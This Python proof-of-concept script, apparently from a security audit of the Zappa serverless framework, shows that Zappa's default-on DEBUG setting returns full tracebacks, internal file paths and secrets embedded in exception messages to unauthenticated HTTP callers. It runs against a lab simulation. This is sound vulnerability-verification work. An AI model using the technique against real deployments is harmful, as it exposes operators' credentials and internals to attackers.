#!/usr/bin/env python3
"""VULN-006 — DEBUG tracebacks returned to the client (default-on).

Vulnerable code : targets/Zappa/zappa/handler.py:342-347 (_handle_request_exception)
                  default set at targets/Zappa/zappa/cli.py:2699 (`debug` defaults True)
Vulnerability   : CWE-209 Generation of Error Message Containing Sensitive Info.
Surface         : A (HTTP request path — internet-facing, unauthenticated).

Mechanism (plain English)
-------------------------
The Lambda handler wraps request processing in a try/except. Any exception that
reaches it — either from Zappa's own request parsing, or propagated out of the
deployed WSGI/ASGI app — is turned into a 500 by `_handle_request_exception`:

    body = {"message": message}
    if settings is not None and settings.DEBUG:
        body["traceback"] = traceback.format_exception(*exc_info)   # <-- full stack
    content["body"] = json.dumps(str(body), ...)                    # returned to caller

When `settings.DEBUG` is true the entire Python traceback (server file paths,
framework internals, and the exception message — which routinely echoes request
data or secrets) is serialised straight into the HTTP response body. The Zappa
CLI defaults `debug` to True (`cli.py:2699` — `self.stage_config.get("debug", True)`),
so this is the default posture unless the operator sets `debug: false`.

Note on reachability: a Flask/Django app in production catches its *own* view
exceptions and renders its own error page, so those never reach Zappa. The leak
fires when an exception *propagates to Zappa's handler*: a bare WSGI app, a WSGI
app configured to propagate (Flask `PROPAGATE_EXCEPTIONS`/`TESTING`), an error in
middleware, or a fault in Zappa's own request/response handling.

What a successful run proves
----------------------------
(1) DEBUG is on by default in this deployment.
(2) When a deployed app propagates an exception, Zappa returns the app's full
    traceback — including a secret embedded in the exception message — to the
    anonymous caller.
(3) The same leak is observable over the live surface when Zappa's own handler
    faults.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, build_request, lab_python, log, raw_event, raw_request, split_response, verdict

VULN = "VULN-006"

SECRET = "S3CRET_DB_PASSWORD_hunter2_in_exception_msg"

# Drive a FRESH LambdaHandler bound to a bare WSGI app that raises (i.e. propagates
# to Zappa, as many real deployments do). This is the realistic Surface-A scenario.
_DRIVER = f"""
import json, sys, types
# A minimal settings module, as Zappa bakes into the Lambda zip.
m = types.ModuleType("vuln006_settings")
for k, v in dict(
    LOG_LEVEL="INFO", PROJECT_NAME="app", API_STAGE="dev", ENVIRONMENT_VARIABLES={{}},
    APP_MODULE="vuln006_app", APP_FUNCTION="app", DJANGO_SETTINGS=None, APP_TYPE=None,
    ADDITIONAL_TEXT_MIMETYPES=None, WEBSOCKET_HANDLER_MODULE=None, DEBUG=True,
    BINARY_SUPPORT=True, CONTEXT_HEADER_MAPPINGS={{}}, EXCEPTION_HANDLER=None,
    DOMAIN=None, BASE_PATH=None, REMOTE_ENV=None, ARCHIVE_PATH=None, SLIM_HANDLER=False,
).items():
    setattr(m, k, v)
sys.modules["vuln006_settings"] = m

# A bare WSGI app whose view raises with a secret in the message (propagates to Zappa).
app_mod = types.ModuleType("vuln006_app")
def app(environ, start_response):
    raise RuntimeError("DB connect failed: {SECRET}")
app_mod.app = app
sys.modules["vuln006_app"] = app_mod

from zappa.handler import LambdaHandler
h = LambdaHandler(settings_name="vuln006_settings")

class Ctx:  # minimal Lambda context
    def get_remaining_time_in_millis(self): return 30000
event = {{"httpMethod": "GET", "path": "/", "headers": {{"Host": "app.example"}},
         "requestContext": {{"identity": {{}}}}}}
res = h.handler(event, Ctx())
print(json.dumps(res))
"""


def main():
    banner(VULN, "DEBUG traceback disclosed to unauthenticated client",
           "zappa/handler.py:342-347 (_handle_request_exception, settings.DEBUG)")

    # 1) Establish the default-on posture.
    log("STEP", "GET /_sim/info — confirming the deployment's DEBUG setting")
    raw = raw_request(build_request("GET", "/_sim/info", {}))
    _s, _h, body = split_response(raw)
    info = json.loads(body.decode())
    log("INFO", f"deployment reports debug={info.get('debug')} (cli.py:2699 defaults debug to True)")
    debug_on = info.get("debug") is True

    # 2) Realistic Surface-A: a deployed app propagates an exception -> Zappa leaks its traceback.
    log("STEP", "driving Zappa's real handler with a WSGI app that raises (models a propagating app)")
    cp = lab_python(_DRIVER)
    if cp.returncode != 0:
        log("FAIL", "driver error:\n" + cp.stderr.decode()[-800:])
        verdict("FAILED", f"{VULN}: FAILED — could not drive handler")
        return 1
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    leaked = res.get("body", "")
    app_secret_leaked = SECRET in leaked
    has_tb = "traceback" in leaked
    has_paths = "/app/zappa/handler.py" in leaked or 'File \\"' in leaked
    log("INFO", f"handler returned statusCode={res.get('statusCode')} ; body[:260]={leaked[:260]!r}")
    log("PROOF", f"the app's secret {SECRET!r} appears in the 500 body sent to the caller "
                 f"(traceback_present={has_tb}, internal_paths_present={has_paths}) — a propagated app "
                 f"exception leaks the full stack + embedded secrets to an anonymous client.")

    # 3) Same leak observable over the live surface when Zappa's own handler faults.
    log("STEP", "live surface: an event that faults inside Zappa's handler also returns the traceback")
    r = raw_event({"httpMethod": "GET"})  # missing 'path' -> Zappa's create_wsgi_request raises
    live_body = (r.get("result") or {}).get("body", "") if isinstance(r.get("result"), dict) else ""
    live_tb = "traceback" in live_body and "/app/zappa/handler.py" in live_body
    log("INFO", f"live 500 body[:200]={live_body[:200]!r}")

    if debug_on and app_secret_leaked and has_tb and live_tb:
        log("OK", "exploit confirmed — DEBUG traceback (with secrets + file paths) returned to the client")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — full traceback + embedded secret leaked in 500 body (DEBUG default-on)")
        return 0
    log("FAIL", f"debug_on={debug_on} secret_leaked={app_secret_leaked} has_tb={has_tb} live_tb={live_tb}")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
